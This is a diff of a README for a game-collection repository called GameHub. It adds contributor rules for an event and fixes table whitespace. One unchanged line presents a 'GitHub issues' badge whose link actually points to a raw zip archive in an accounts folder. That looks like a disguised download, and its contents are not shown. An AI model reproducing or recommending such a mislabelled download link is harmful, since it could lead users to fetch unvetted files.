@@ -10,7 +10,11 @@
 ![GitHub issues](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
 
 >
-
+## Rules For ECWoC26
+- It is important to star the repo , otherwise your  contribution will not count.
+- You need to make a proper docs for the feature you are trying to implement and share it with me using docs in mail.
+- Only the meaningful issue which are important will only be considered , other will be close.
+- More priority will be given to the contributors who have lower rank in leaderboard.
 ***
 
 ## 🧭 Table of Contents
@@ -109,10 +113,10 @@ In an era of complex game engines and heavy frameworks, GameHub proves that amaz
 | **Jump Tag**             | Tag targets by jumping                   | Movement accuracy, reflex-based                  |
 | **Logic Path**           | Guide the ball using logic               | Puzzle-solving, progressive levels               |
 | **Memory Blink**         | Remember blinking patterns               | Memory training, increasing speed                |
-| **Pattern Memory**       | Remember and repeat patterns             | Sequence memory, difficulty scaling             |
+| **Pattern Memory**       | Remember and repeat patterns             | Sequence memory, difficulty scaling              |
 | **Pipe Twister**         | Rotate pipes to connect flows            | Logic rotation puzzles                           |
 | **Reaction Speed Test**  | Test your reaction speed                 | Tap-time measurement, instant feedback           |
-| **Sand Draw**            | Draw freely in virtual sand              | Relaxing UI, creative drawing                   |
+| **Sand Draw**            | Draw freely in virtual sand              | Relaxing UI, creative drawing                    |
 | **Sliding Puzzle**       | Slide blocks to complete image           | Logical movement, image puzzles                  |
 | **Speed Tap Grid**       | Tap targets quickly on a grid            | Reflex speed, time challenge                     |
 | **Symbol Swap**          | Swap symbols to match rows               | Pattern logic, strategic thinking                |
